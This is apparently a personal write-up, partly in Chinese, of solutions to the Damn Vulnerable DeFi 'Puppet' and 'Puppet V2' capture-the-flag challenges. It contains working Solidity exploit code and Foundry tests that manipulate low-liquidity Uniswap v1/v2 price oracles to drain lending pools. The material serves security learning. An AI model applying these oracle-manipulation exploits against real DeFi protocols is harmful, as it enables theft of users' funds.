# 9.03

# **Puppet**

desc

```markdown
# Puppet

There’s a lending pool where users can borrow Damn Valuable Tokens (DVTs). To do so, they first need to deposit twice the borrow amount in ETH as collateral. The pool currently has 100000 DVTs in liquidity.

There’s a DVT market opened in an old Uniswap v1 exchange, currently with 10 ETH and 10 DVT in liquidity.

Pass the challenge by saving all tokens from the lending pool, then depositing them into the designated recovery account. You start with 25 ETH and 1000 DVTs in balance.

```

之前学过defi课程讲过uniswap v1的价格预言机存在会被操作的漏洞（尤其是流动性低的情况下）。

就是往流动性池子里加入很多的DVTs,使得DVTs的价格暴跌,从而使得我们可以用很少的eth借出所有的DVTs

exp:

```solidity
// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity =0.8.25;
import {Test, console} from "forge-std/Test.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {PuppetPool} from "../../src/puppet/PuppetPool.sol";
import {IUniswapV1Exchange} from "../../src/puppet/IUniswapV1Exchange.sol";
contract PuppetExploit {
    DamnValuableToken token;
    PuppetPool lendingPool;
    IUniswapV1Exchange uniswapV1Exchange;
    address recovery;
    constructor(
        DamnValuableToken _token,
        PuppetPool _lendingPool,
        IUniswapV1Exchange _uniswapV1Exchange,
        address _recovery 
    ) payable {
        token = _token;
        lendingPool = _lendingPool;
        uniswapV1Exchange = _uniswapV1Exchange;
        recovery = _recovery;
    }
    function attack(uint exploitAmount) public {
        uint tokenBalance = token.balanceOf(address(this));
        token.approve(address(uniswapV1Exchange), tokenBalance);
        uniswapV1Exchange.tokenToEthTransferInput(tokenBalance, 9, block.timestamp, address(this));
        lendingPool.borrow{value: address(this).balance}(
            exploitAmount,
            recovery
        );
    }
    receive() external payable {
    }
}

```

```bash
    function test_puppet() public checkSolvedByPlayer {
        PuppetExploit exploit = new PuppetExploit{value:PLAYER_INITIAL_ETH_BALANCE}(
            token,
            lendingPool,
            uniswapV1Exchange,
            recovery
        );
        token.transfer(address(exploit), PLAYER_INITIAL_TOKEN_BALANCE);
        exploit.attack(POOL_INITIAL_TOKEN_BALANCE);
    }
```

# Puppet-V2

desc

```markdown
# Puppet V2

The developers of the [previous pool](https://damnvulnerabledefi.xyz/challenges/puppet/) seem to have learned the lesson. And released a new version.

Now they’re using a Uniswap v2 exchange as a price oracle, along with the recommended utility libraries. Shouldn't that be enough?

You start with 20 ETH and 10000 DVT tokens in balance. The pool has a million DVT tokens in balance at risk!

Save all funds from the pool, depositing them into the designated recovery account.

```

跟上一道类似，，只是换成了weth。。

```solidity
    function test_puppetV2() public checkSolvedByPlayer {
        token.approve(address(uniswapV2Router), PLAYER_INITIAL_TOKEN_BALANCE);
        address[] memory path = new address[](2);
        path[0] = address(token);
        path[1] = address(weth);
        // swap token to weth
        uniswapV2Router.swapExactTokensForTokens(
            PLAYER_INITIAL_TOKEN_BALANCE, // amount in
            1,                            // amount out min
            path,                         // path
            address(player),              // to
            block.timestamp*2             // deadline
        );
        uint256 value = lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE);
        uint256 depositValue = value - weth.balanceOf(address(player));
        weth.deposit{value: depositValue}();
        weth.approve(address(lendingPool), value);
        lendingPool.borrow(POOL_INITIAL_TOKEN_BALANCE);
        token.transfer(recovery, POOL_INITIAL_TOKEN_BALANCE);
    }
```